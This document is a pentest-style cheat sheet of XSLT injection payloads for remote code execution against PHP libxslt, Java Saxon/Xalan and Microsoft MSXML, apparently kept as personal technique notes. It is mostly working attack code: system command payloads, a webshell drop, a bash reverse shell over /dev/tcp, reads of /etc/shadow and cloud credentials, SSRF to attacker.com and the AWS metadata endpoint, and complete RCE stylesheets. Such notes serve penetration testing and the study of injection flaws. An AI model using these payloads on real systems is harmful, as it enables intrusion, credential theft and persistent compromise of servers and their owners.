---
aliases:
  - XSLT RCE
  - XSLT Extension Functions
  - 'XSLT php:function'
  - XSLT Java reflection
tags:
  - type/technique
  - vuln/xslt-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
---
# XSLT - Extension Functions (RCE)

***

Workflow: el payload XSLT se envía como cuerpo de la request `curl -X POST -H "Content-Type: application/xml" --data @payload.xsl https://target/transform`. Col 1 abajo es el contenido del archivo `payload.xsl` (sólo el body relevante; el header `<?xml ?><xsl:stylesheet ...>` está implícito).

## PHP / libxslt

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<xsl:value-of select="function-available('php:function')"/>` con `xmlns:php="http://php.net/xsl"` | Detect `registerPHPFunctions()` active | Pre-attack probe. |
| `<xsl:value-of select="php:function('system','id')"/>` | RCE basic system('id') | Standard PHP RCE. |
| `<xsl:value-of select="php:function('shell_exec','id&gt;/tmp/o')"/>` luego LFI `/tmp/o` | shell_exec + post-LFI captured output | Captured output. |
| `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>` | LFI via file_get_contents | Direct LFI. |
| `<xsl:value-of select="php:function('file_get_contents','http://attacker.com/x')"/>` | SSRF via file_get_contents | SSRF combo. |
| `<xsl:value-of select="php:function('file_put_contents','/var/www/html/sh.php','&lt;?=`$_GET[c]`?&gt;')"/>` then `curl https://target/sh.php?c=id` | Webshell drop + trigger | Persistence. |
| `<xsl:value-of select="php:function('system','bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&quot;')"/>` | Reverse shell PHP | RS. |
| `<xsl:value-of select="php:function('eval',php:function('base64_decode','BASE64_PAYLOAD'))"/>` | eval base64 obfuscation bypass | Obfuscate. |
| `<xsl:value-of select="php:function('assert','system(&quot;id&quot;)')"/>` | assert() eval PHP <8.0 | PHP <8. |
| `<xsl:value-of select="php:function('phpinfo')"/>` | phpinfo() recon dump | Recon. |
| `<xsl:value-of select="php:function('passthru','id')"/>` | passthru alt to system | Alt. |
^xslt-rce-php

### Backend vulnerable típico

```php
$xsl = new XSLTProcessor();
$xsl->registerPHPFunctions();   // key: habilita namespace php:function
$xsl->importStyleSheet(DOMDocument::loadXML($user_xsl));
echo $xsl->transformToXML(new DOMDocument());
```

___

## Java / Saxon

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<xsl:value-of select="function-available('saxon:evaluate')"/>` con `xmlns:Runtime="java:java.lang.Runtime"` | Detect Saxon-PE/EE (saxon:evaluate available) | Pre-attack. |
| `<xsl:variable name="rt" select="Runtime:getRuntime()"/><xsl:variable name="proc" select="Runtime:exec($rt, 'id')"/>` con `xmlns:Runtime="java:java.lang.Runtime"` | Runtime command execution basic id | Basic Saxon. |
| `<xsl:variable name="rt" select="Runtime:getRuntime()"/><xsl:variable name="proc" select="Runtime:exec($rt, ('bash','-c','id; whoami'))"/>` | Runtime array args (safe quoting) | Array args safe. |
| Full PoC con Runtime:getRuntime + Process:getInputStream + Scanner:next → ver bloque XML completo abajo | Saxon RCE con stdout capture | Output capture. |
| `<xsl:value-of select="saxon:evaluate(concat('Run','time:exec(...)'))"/>` | saxon:evaluate dynamic XPath | Filter bypass. |
| `<xsl:value-of select="saxon:read-binary-resource('file:///etc/shadow')"/>` | saxon binary file read | Saxon binary read. |
| `<xsl:variable name="p" select="rt:exec(rt:getRuntime(), 'id')"/>` con `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` | Xalan Java RCE (different namespace) | Xalan stack. |
| `<xsl:variable name="pb" select="PB:new(('bash','-c','id'))"/>` con `xmlns:PB="java:java.lang.ProcessBuilder"` | ProcessBuilder array args modern | Modern Java. |
| `<xsl:value-of select="java:lang:System:getenv('AWS_ACCESS_KEY_ID')"/>` (Saxon env access) | Read env vars Saxon PE/EE | Env recon. |
| `<xsl:value-of select="java:lang:System:getProperty('user.dir')"/>` | System property read | Props. |
^xslt-rce-saxon

### Stylesheet completo Saxon RCE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:Runtime="java:java.lang.Runtime"
    xmlns:Process="java:java.lang.Process"
    xmlns:Scanner="java:java.util.Scanner">
  <xsl:template match="/">
    <xsl:variable name="rt" select="Runtime:getRuntime()"/>
    <xsl:variable name="proc" select="Runtime:exec($rt, 'id')"/>
    <xsl:variable name="is" select="Process:getInputStream($proc)"/>
    <xsl:variable name="sc" select="Scanner:new($is)"/>
    <xsl:variable name="_" select="Scanner:useDelimiter($sc, '\A')"/>
    <output><xsl:value-of select="Scanner:next($sc)"/></output>
  </xsl:template>
</xsl:stylesheet>
```

___

## Microsoft / MSXML

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<xsl:value-of select="function-available('msxsl:script')"/>` con `xmlns:msxsl="urn:schemas-microsoft-com:xslt"` | Detect msxsl:script availability | Pre-attack. |
| `<msxsl:script language="JScript" implements-prefix="ext"><![CDATA[function r(c){var s=new ActiveXObject("WScript.Shell");return s.Exec("cmd /c "+c).StdOut.ReadAll()}]]></msxsl:script><xsl:value-of select="ext:r('whoami')"/>` | Inline JScript ActiveX shell run | Inline JScript. |
| `<msxsl:script language="C#" implements-prefix="ext"><![CDATA[public string r(string c){var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();return p.StandardOutput.ReadToEnd();}]]></msxsl:script><xsl:value-of select="ext:r('whoami')"/>` | C# Process.Start cmd run | C# RCE inline. |
| `<msxsl:script language="VBScript" implements-prefix="ext"><![CDATA[Function r(c): Set s = CreateObject("WScript.Shell"): r = s.Exec("cmd /c " & c).StdOut.ReadAll(): End Function]]></msxsl:script><xsl:value-of select="ext:r('whoami')"/>` | VBScript ActiveX alt | VBScript variant. |
| `<msxsl:script language="JScript" implements-prefix="ext"><![CDATA[function r(){var s=new ActiveXObject("Scripting.FileSystemObject");return s.OpenTextFile("C:\\Windows\\win.ini",1).ReadAll()}]]></msxsl:script><xsl:value-of select="ext:r()"/>` | JScript FSO file read | File read JScript. |
| `<msxsl:script language="C#" implements-prefix="ext"><![CDATA[public string r(){return System.IO.File.ReadAllText(@"C:\Windows\win.ini");}]]></msxsl:script><xsl:value-of select="ext:r()"/>` | C# File.ReadAllText | C# file read. |
| `<msxsl:script language="JScript" implements-prefix="ext"><![CDATA[function r(){var x=new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");x.open("GET","http://169.254.169.254/latest/meta-data/",false);x.send();return x.responseText}]]></msxsl:script><xsl:value-of select="ext:r()"/>` | JScript MSXML2 SSRF AWS metadata | SSRF combo. |
| `<msxsl:script language="C#" implements-prefix="ext"><![CDATA[public string r(){var c=new System.Net.WebClient();return c.DownloadString("http://169.254.169.254/latest/meta-data/");}]]></msxsl:script><xsl:value-of select="ext:r()"/>` | C# WebClient SSRF | C# SSRF. |
| `<msxsl:script language="JScript" implements-prefix="ext"><![CDATA[function r(){var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.LoadFromFile("C:\\inetpub\\wwwroot\\web.config");return s.ReadText()}]]></msxsl:script><xsl:value-of select="ext:r()"/>` | ADODB.Stream file read | ADODB alt read. |
| `<msxsl:script language="C#" implements-prefix="ext"><![CDATA[public string r(string u, string p){var d=new System.DirectoryServices.DirectoryEntry("LDAP://target.local",u,p);return d.Properties["distinguishedName"].Value.ToString();}]]></msxsl:script><xsl:value-of select="ext:r('admin','Spring2025!')"/>` | C# AD bind probe | AD combo. |
^xslt-rce-msxml

### Stylesheet completo JScript RCE

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:ext="urn:extension">
  <msxsl:script language="JScript" implements-prefix="ext">
    <![CDATA[
      function runCmd(cmd) {
        var wsh = new ActiveXObject("WScript.Shell");
        var exec = wsh.Exec("cmd /c " + cmd);
        return exec.StdOut.ReadAll();
      }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="ext:runCmd('whoami /all')"/>
  </xsl:template>
</xsl:stylesheet>
```

***
